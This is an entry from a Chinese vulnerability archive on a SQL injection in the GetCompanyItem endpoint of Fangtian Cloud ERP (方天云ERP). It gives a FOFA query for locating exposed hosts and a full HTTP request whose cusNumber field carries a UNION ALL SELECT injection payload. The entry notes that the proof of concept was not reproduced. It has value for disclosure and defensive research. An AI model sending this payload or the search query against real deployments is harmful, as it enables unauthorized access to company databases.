---
source: "wy876 漏洞文库"
title: "方天云ERP GetCompanyItem cusNumber SQL 注入"
product: "方天云ERP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "session示例，未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/bh8s1goi997wx46g"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%96%B9%E5%A4%A9%E7%A7%91%E6%8A%80%28%E6%B7%B1%E5%9C%B3%29%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%96%B9%E5%A4%A9%E4%BA%91ERP%E7%B3%BB%E7%BB%9FGetCompanyItem%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"AjaxMethods.asmx/GetCompanyItem\""
fofa_unverified: "body="
id: "vw-b33283e86dbb88e9f1c123c8"
entity_id: "ve-b33283e86dbb88e9f1c123c8"
schema_version: "1"
---

# 方天云ERP GetCompanyItem cusNumber SQL 注入

## 条目说明

- 对象与具体问题：方天云ERP；GetCompanyItem cusNumber SQLi
- 版本、配置及部署条件：无版本
- 认证与权限前提：session示例，未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- FOFA body截断，联合常量需解码及响应匹配但无结果
- 源码/修复/数据库版本缺失；与60不同接口参数不能合并成一PoC

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
方天软件以云ERP+MES产品为核心，整合设备层的工业数据，提供软硬件智能+整合方案服务，赋能数字工厂新智造。在模具制造、五金机械、塑胶成型、电子组装等行业成效显著，包括财富500强的企业也正在通过方天软件的综合管理方案而持续获益。方天云ERP系统GetCompanyItem存在SQL注入漏洞

## 二、影响版本
+ 方天云ERP

## 三、资产测绘
+ fofa`body="AjaxMethods.asmx/GetCompanyItem"`
+ 特征


## 四、漏洞复现
```http
POST /AjaxMethods.asmx/GetCompanyItem HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cookie: ASP.NET_SessionId=scc55si
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
X-Requested-With: XMLHttpRequest
Content-Type: application/json

{"cusNumber":"' UNION ALL SELECT NULL,CHAR(113)+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(112)+CHAR(67)+CHAR(77)+CHAR(115)+CHAR(70)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(87)+CHAR(71)+CHAR(120)+CHAR(69)+CHAR(70)+CHAR(120)+CHAR(74)+CHAR(82)+CHAR(109)+CHAR(97)+CHAR(84)+CHAR(66)+CHAR(100)+CHAR(78)+CHAR(119)+CHAR(110)+CHAR(66)+CHAR(103)+CHAR(74)+CHAR(69)+CHAR(84)+CHAR(107)+CHAR(109)+CHAR(119)+CHAR(121)+CHAR(113)+CHAR(120)+CHAR(70)+CHAR(101)+CHAR(102)+CHAR(101)+CHAR(122)+CHAR(113)+CHAR(122)+CHAR(106)+CHAR(106)+CHAR(113)-- cRcq"}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bh8s1goi997wx46g>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
